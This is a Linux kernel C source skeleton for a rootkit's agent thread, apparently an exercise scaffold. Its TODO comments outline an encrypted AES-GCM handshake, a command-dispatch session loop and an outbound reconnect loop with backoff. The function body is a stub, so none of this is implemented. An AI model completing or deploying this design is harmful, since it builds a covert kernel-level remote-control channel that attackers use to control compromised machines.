// SPDX-License-Identifier: GPL-2.0
// network/agent.c - Agent kthread: connect, handshake, session loop.
#include <crypto/aead.h>
#include <linux/delay.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <net/net_namespace.h>

#include "rootkit.h"

/*
 * TODO: Implement rk_handshake (static).
 *
 * Exchange encrypted HELLO to confirm both sides share the key.
 * 1. rk_send_sealed "HELLO" (5 bytes).
 * 2. rk_recv_sealed into a small buffer.
 * 3. Verify response is exactly "HELLO" (5 bytes).
 * 4. Return -EPROTO on mismatch.
 */

/*
 * TODO: Implement rk_session_init (static).
 *
 * 1. crypto_alloc_aead("gcm(aes)", 0, 0).
 * 2. crypto_aead_setauthsize(tfm, RK_TAG_LEN).
 * 3. crypto_aead_setkey(tfm, rk_key, RK_KEY_LEN).
 * 4. get_random_bytes for session_id.
 * 5. Set sock, tx_seq=0, rx_seq_expected=0.
 * 6. On error, crypto_free_aead and return error.
 */

/*
 * TODO: Implement rk_handle_session (static).
 *
 * 1. kmalloc a RK_FRAME_MAX command buffer.
 * 2. Loop while !kthread_should_stop:
 *    a. rk_recv_sealed to get the next command.
 *    b. rk_dispatch(session, buf, len) to handle it.
 *    c. Break on any error.
 * 3. kfree the buffer.
 */

/*
 * TODO: Implement rk_agent_thread.
 *
 * Outer reconnect loop (while !kthread_should_stop):
 * 1. rk_connect to get a socket.
 * 2. rk_session_init with the socket.
 * 3. rk_handshake.
 * 4. On success: reset backoff, rk_handle_session.
 * 5. Teardown: crypto_free_aead, kernel_sock_shutdown,
 *    sock_release.
 * 6. msleep_interruptible(delay_ms) with exponential backoff
 *    from retry_base_ms up to retry_max_ms.
 */
int rk_agent_thread(void *data)
{
	return 0;
}
